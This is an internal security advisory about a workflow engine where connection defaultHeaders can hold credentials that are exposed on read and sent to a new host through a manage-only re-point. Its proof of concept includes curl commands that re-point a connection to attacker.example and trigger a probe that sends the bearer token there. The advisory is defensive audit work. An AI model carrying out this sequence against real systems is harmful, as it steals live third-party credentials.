---
id: SEC-075
title: Connection defaultHeaders hold pasted credentials but are treated as non-secret — values returned on read, and carried to a new host by a workflow:manage-only re-point
severity: medium
status: open
cwe: CWE-522
discovered: 2026-09-24
module: workflow-engine (connections)
tags: [credential-exposure, sod, csec-1, exfiltration, workflow-engine]
---

# SEC-075 — Connection `defaultHeaders` are a credential channel outside CSEC-1 and INV-6

## Summary

A REST connection's `defaultHeaders` are documented as "never a credential" but not validated, so an
operator can paste `Authorization: Bearer …` there. The API then returns the value to any
`workflow:read` holder, and a `workflow:manage`-only principal can re-point the connection to a host they
control and send the header there. The separation of `workflow:manage` and `workflow:secrets` (CSEC-1)
does not cover this path.

## Description

`RestConnectionConfigSchema.defaultHeaders` (`packages/shared/src/schemas/workflow.ts:220`) is a free
`record<string, string>` with only a comment saying it never carries a credential. Nothing rejects
`Authorization`, `Cookie`, `X-Api-Key` or a token-shaped value. For a target that only needs a static
header, putting the token in `defaultHeaders` (with `authScheme: NONE`) is the easiest setup, so real
connections will have one.

Two consequences:

1. **Read exposure.** `GET /workflow-connections/:id` and `GET /workflow-connections`
   (`workflow-connections.controller.ts:41-68`, gated only by `workflow:read`) return the raw `config`
   row, header values included (`workflow-connections.service.ts:97-123`). The dry-run preview
   (`POST /workflow-runs/dry-run`, `workflow:manage`) also echoes them
   (`workflow-dry-run.service.ts:358-361`). `workflow:read` is ADMIN-only by seed but can be granted to a
   custom role, and it is **grantable to a service account** (it is not in
   `SERVICE_ACCOUNT_UNGRANTABLE_PERMISSIONS`). A read-only monitoring token can therefore read a
   credential that the secret store (`workflow:secrets`, INV-6 "credential by reference only") is
   supposed to hold. The AI read tool already redacts these values (`ai/tools/workflows.tools.ts:372-376`);
   the HTTP route does not.
2. **Re-point exfiltration.** `assertMaySetCredentialBinding` (`workflow-connections.service.ts:237-267`)
   requires `workflow:secrets` only when a `secretId` is attached, or when the host changes on a
   connection that has a `secretId`. A connection whose credential is in `defaultHeaders` has
   `secretId: null`, so `willBearSecret` is false and a host change passes with `workflow:manage` alone.
   The REST handler copies every default header onto each call and onto the test probe
   (`rest.handler.ts:62-67`, `:172-177`), so the next run, or an immediate `POST /:id/test`, sends the
   token to the new host. The egress guard strips non-safelisted headers only on a **redirect** that
   changes origin (`egress-guard.ts:416-426`). It does nothing here because the configured origin is
   itself the attacker's. The AI authoring tool (#1354) already treats this as sensitive: it cannot set
   `defaultHeaders`, it names them on a re-point card, and it requires `workflow:secrets` for the
   re-point (`docs/ai-assistant/security.md` "Residual risk"). The route has none of these checks.

## Impact

Medium. A principal with `workflow:manage` but not `workflow:secrets` (the separation CSEC-1 exists to
enforce), or with only `workflow:read`, obtains a live third-party credential. Both permissions are
ADMIN-only by default, so on a default install the attacker is an admin who already holds
`workflow:secrets` and nothing is gained. The finding matters on instances that split these duties, or
that give `workflow:read` to a service account or custom role. Severity depends on operators pasting
tokens into `defaultHeaders`. Nothing prevents that and the UI does not warn against it.

## Proof of concept

Reasoned from the code, **not executed**.

```sh
# Setup (an admin): REST connection C, authScheme NONE, defaultHeaders {"Authorization":"Bearer sk_live_…"}, secretId null.

# (a) read: any workflow:read holder, including a service-account token
curl /api/workflow-connections/$C -H "Authorization: Bearer lzit_sa_…"
# -> { "config": { "defaultHeaders": { "Authorization": "Bearer sk_live_…" }, … } }

# (b) re-point: principal with workflow:manage, WITHOUT workflow:secrets
curl -X PATCH /api/workflow-connections/$C -H "Authorization: Bearer <manage-only>" \
  -d '{"config":{"kind":"REST","baseUrl":"https://attacker.example","authScheme":"NONE","defaultHeaders":{"Authorization":"Bearer sk_live_…"}}}'
# -> 200 (willBearSecret=false, so the CSEC-1 gate is skipped)
curl -X POST /api/workflow-connections/$C/test -H "Authorization: Bearer <manage-only>"
# -> attacker.example receives "Authorization: Bearer sk_live_…"
```

`config` is replaced whole, so in (b) the PATCH has to send the header values again. The attacker has
them from (a), or the web connection form fills them in from the same read.

## Affected

At `origin/dev` 62aa1e53.

- `packages/shared/src/schemas/workflow.ts:219-220`: `defaultHeaders` is unvalidated and "non-secret" by comment only.
- `apps/api/src/workflow-engine/definitions/workflow-connections.controller.ts:41-68`: list/get under `workflow:read` return the raw config.
- `apps/api/src/workflow-engine/definitions/workflow-connections.service.ts:246-258`: the CSEC-1 gate ignores `defaultHeaders`.
- `apps/api/src/workflow-engine/handlers/rest.handler.ts:62-67`, `:172-177`: headers applied to runs and the probe.
- `apps/api/src/workflow-engine/dry-run/workflow-dry-run.service.ts:358-361`: dry-run echoes the values.

## Recommendation

Minimal fix, API-only and with no schema change:

1. **CSEC-1 covers headers.** In `assertMaySetCredentialBinding`, treat a connection as carrying a
   credential when it has any `defaultHeaders`, either before or after the patch:
   `const carriesHeaders = Object.keys(before.defaultHeaders ?? {}).length > 0 || Object.keys(after.defaultHeaders ?? {}).length > 0;`
   Then require `workflow:secrets` when `changingHost && (willBearSecret || carriesHeaders)`. Also require
   it for any change to `defaultHeaders` values.
2. **Redact on read.** Return `defaultHeaders` values as `"[redacted]"` from list/get and the dry-run
   preview, the same way the AI read tool does. On PATCH, a value equal to the sentinel keeps the stored
   value, so a UI round-trip does not overwrite the token.

Follow-up hardening: on write, reject credential-named headers (`authorization`, `proxy-authorization`,
`cookie`, `x-api-key`, and the connection's own `authHeaderName`) in `defaultHeaders`, and point the
operator to `authScheme` + a `secretId`. Enforce this only when the field is written. Existing rows still
read and run as they do today.

Upgrade safety: nothing is migrated and existing header values keep working. Only the read shape
(redacted) and the permission for a re-point change. The web connection form needs the sentinel-keeps-value
behaviour, and the Manual page for connections should say that credentials go in the secret store.

## Prevention

- One rule for connection config: any field that can reach the wire as a header is treated as a
  potential credential for SoD and redaction, not only `secretId`.
- Add a spec in `workflow-connections.service.spec.ts`: a manage-only principal re-pointing a
  `secretId: null` connection that has `defaultHeaders` gets 403. Also add a controller read spec that
  asserts header values are redacted.

## References

- CWE-522 (Insufficiently Protected Credentials), CWE-200.
- `docs/ai-assistant/security.md` "Residual risk" (the route gap found in W2-14) · ADR-0054 §4/§6 ·
  epic #1315, PR #1354.
